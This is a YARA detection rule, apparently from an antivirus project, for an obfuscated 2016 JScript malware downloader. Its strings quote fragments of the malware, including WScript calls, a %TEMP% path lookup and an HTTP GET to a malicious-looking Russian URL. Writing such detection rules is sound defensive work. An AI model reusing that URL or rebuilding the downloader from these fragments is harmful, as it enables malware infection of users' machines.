rule sig_20160428_864e9f09802fbfa6dd1672452f0be9b4 {
  meta:
    description = "datamaliciousorder - file 20160428_864e9f09802fbfa6dd1672452f0be9b4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "14dde6a8c1240f443b309d91c6a46b2c5783980c5ccf3cb59730dbba11f433b4"

  strings:
    $s1  = "function IluHbyMjzTybZpdIgkYlf(SrjHncBdxYvaCrtDxtWot){CibPjaNkwBbdBwaPswFpm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function IluHbyMjzTybZpdIgkYlf(SrjHncBdxYvaCrtDxtWot){CibPjaNkwBbdBwaPswFpm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VkxAvaUnwDnjMnvVqlRct() {return CibPjaNkwBbdBwaPswFpm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var CibPjaNkwBbdBwaPswFpm = function UtrAguJchDlrPffDgiFcy() {return UlmRrqEjsNaeDadUjaYzw[WcsBwuQxcWnpOguQosHhn](\"WScript\"+\"" ascii
    $s5  = "function VgpTcdNqwChtHovPjbVbh(NneFktKqfMfiAufGjpRhs, JcqIllNunIsmYvgFleSeg){AwhMweUelMfeEtvQbaGwg = AwhMweUelMfeEtvQbaGwg * 1; " ascii
    $s6  = "return NneFktKqfMfiAufGjpRhs - JcqIllNunIsmYvgFleSeg;};" fullword ascii
    $s7  = "OxvZblZoqTjoWlpXmwXng[XewHjdBrnBbiCzcUkeKqs](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var UlmRrqEjsNaeDadUjaYzw = this[\"WScript\"];" fullword ascii
    $s9  = "var CibPjaNkwBbdBwaPswFpm = function UtrAguJchDlrPffDgiFcy() {return UlmRrqEjsNaeDadUjaYzw[WcsBwuQxcWnpOguQosHhn](\"WScript\"+\"" ascii
    $s10 = "function VkxAvaUnwDnjMnvVqlRct() {return CibPjaNkwBbdBwaPswFpm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function AteVkmQcgZouLepQqmNrl(){return GnbQlqMzsJviTcoKtwKba + \"\";};" fullword ascii
    $s12 = "if (OxvZblZoqTjoWlpXmwXng[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function VgpTcdNqwChtHovPjbVbh(NneFktKqfMfiAufGjpRhs, JcqIllNunIsmYvgFleSeg){AwhMweUelMfeEtvQbaGwg = AwhMweUelMfeEtvQbaGwg * 1; " ascii
    $s14 = "function MhkOvdOahRbvXetMhjWel() {return ((RtpBanDncSlmRdcUdcWcs == true) && (RtpBanDncSlmRdcUdcWcs == UzxLvpBwrQapEibFrtHnc)) ?" ascii
    $s15 = "function MhkOvdOahRbvXetMhjWel() {return ((RtpBanDncSlmRdcUdcWcs == true) && (RtpBanDncSlmRdcUdcWcs == UzxLvpBwrQapEibFrtHnc)) ?" ascii
    $s16 = "function AfzEbpVxkPuuWfnOofJdn()" fullword ascii
    $s17 = "var ZzoGasWzrGiuEfeEmdObp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "RtpBanDncSlmRdcUdcWcs = true; " fullword ascii
    $s19 = "}while (RkcPjqPfzUbzOykHjpVpb);" fullword ascii
    $s20 = "UzxLvpBwrQapEibFrtHnc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}